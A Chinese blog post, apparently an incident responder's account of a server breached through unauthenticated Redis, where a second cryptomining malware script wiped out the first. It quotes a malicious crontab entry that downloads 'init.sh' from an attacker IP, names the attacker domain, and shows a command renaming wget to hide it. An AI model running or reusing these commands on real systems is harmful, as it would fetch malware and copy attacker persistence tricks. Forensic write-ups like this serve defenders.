# 睡前小故（ying）事（ji）

睡前接到告警，发现某服务器的 crontab 有一条这个内容：

```




REDIS0008�	redis-ver4.0.6�
```

嗐，一看就知道是 Redis 进来的...![](../Images/fa8b2d76e9427d0051a6cf5188eb9543.png)应急响应做多了，都没当初那种兴奋的感觉了...连上服务器之后，看了一下进程信息，只发现了一个 `king` 开头的进程，cpu 占用率很低。这就很奇怪了![](../Images/9ae433f9438705f2a69799f68c8c25ef.png)，这帮大黑阔们写工具、病毒，批量扫描外网服务入侵可不是闲着没事做的，不吸干你的性能怎么肯罢休？![](../Images/69be220b6daeed3374bfed7a03dc85f8.png)并且看了一下 cron 的日志（只有从 26 号开始的），curl 一直是的失败的，原因是 `curl not found`，这就很有意思了。Google 了一下 `d.powerofwish.com` 相关的信息，发现全是通过 Redis 未授权访问进来的。查了一下记录，这个服务器前段时间的确扫出过一个 Redis 未授权访问，但是已经修复了。而 HIDS 正好是今天才部署的，所以可能已经被入侵一段时间了。查看 `/tmp/` 下的病毒创建时间，的确是对的上的。至此，所有信息都指向了 Redis 未授权访问，溯源差不多完成了：通过 Redis 未授权访问进入服务器，写 Crontab 做了持久化。

  

回到之前那个疑问：这帮大黑阔可不是什么好心人![](../Images/abf503b08791f66c7209730eb9b15974.png)，虽然前段时间有个新闻，说有攻击者扫描全网入侵未授权的 es、MongoDB 等，成功直接清空所有的数据，还有个名字叫 `MEOWBOT`（喵星人？![](../Images/dd377b71b8f05031abb44deb130c5d4c.png)我汪星人什么时候能崛起！气抖冷！）。入侵服务器必有所图，现在一般都是挖门罗币，可是这个服务器并没有挖矿进程在运行。既然如此，那莫非是想将服务器当做肉鸡？![](../Images/7da32d81a2e32a4c13b5975d75bf3eef.png)于是我检查了一下 ssh key，发现 `authorized_keys` 新增了几条，特征是 `root@u17` 结尾，随后又在 root 的 crontab 配置文件中发现了 `cur http://185.181.10.234/E5DB0E07C3D7BE80V520/init.sh`。经过搜索，发现这居然是另一种病毒，也是利用 Redis 未授权入侵的...![](../Images/7da32d81a2e32a4c13b5975d75bf3eef.png)

  

那就 curl 下来瞅瞅呗。`init.sh` 代码还稍有点多，实际上做的事情就是：**杀掉其他挖矿病毒**、将常用命令替换，例如`curl`换成`cur`这样：

```






mv /usr/bin/wget /usr/bin/get
```

而 `init.sh` 的击杀目标里正好有 `pm.sh`相关的文件！

![](../Images/09b0a62f942ed238cac6ddb606f37b1d.png)

那有意思的就来了，所以服务器没有运行挖矿病毒，是不是因为 `pm.sh` 的进程与相关恶意文件（`kin` 开头）已经被 `init.sh` 全干掉了呢？在我溯源文件的修改时间定位入侵顺序，理清楚时间线之后，我已经脑补出一部大片了![](../Images/6b4cb7842191b6645c399a7eb4e8a5bf.png)

  

`pm.sh`（就叫小 p 了）是第一个通过 redis 未授权进来的病毒，首先判断是不是存在一个 bin 文件，如不存在，就下载它，然后执行这个 bin 文件。每隔 10 分钟它就会通过 crontab 运行一遍上面的流程。

`init.sh`（就叫小 i 了）是第二个通过 redis 未授权进来的病毒，它也是通过 crontab 10 分钟运行一次，但是它还替换了 `curl`、杀死了自己的竞争者。（改一改都可以当做杀毒脚本了![](../Images/dd377b71b8f05031abb44deb130c5d4c.png)）

  

虽然 小 p 比小 i 早进入到服务器，获得了 root 权限，但是小 p 并没有挤兑同行与做自我保护![](../Images/ba8a17f5381d38e4507957d2a37171bc.png)，从而被后来居上的小 i 清空了 小 p 的所有病毒文件，并且替换了多个可用于下载的命令，导致了小 p 无法重新下载（执行 curl）（这解释了为何 cron 日志告诉我们小 p 的 curl 其实没有执行成功，且又有成功下载的文件）。我本以为是小 p 与小 i 的激烈对战，没想到只是小 i 的单方面屠杀。小 i 心思细腻（如果你认真看上面的内容的话，你会发现小 i 的 crontab 用的是 cur 而不是 curl），斩草除根，出手冷酷，实乃杀手典范![](../Images/dfbe11e83674398549a8a682806348d3.png)。在排查的过程中，我还发现了另一个疑似残留的病毒文件：`/tmp/redis2`，同样在小 i 的击杀名单上。至于它到底是小 p 的，还是第三种病毒，已经无从考证了，因为它早已经被小 i 轰杀至渣了![](../Images/dd377b71b8f05031abb44deb130c5d4c.png)...要不是因为入侵的是我们公司的服务器，我真想给小 i 鼓个掌。

虽然挖矿病毒的同行竞争还是挺常见的，但是这是我第一次遇到真正把对手打败的案例。

清理完毕，夜也深了，这个没有硝烟的战场最后并没有赢家。

  

呵，黑阔。
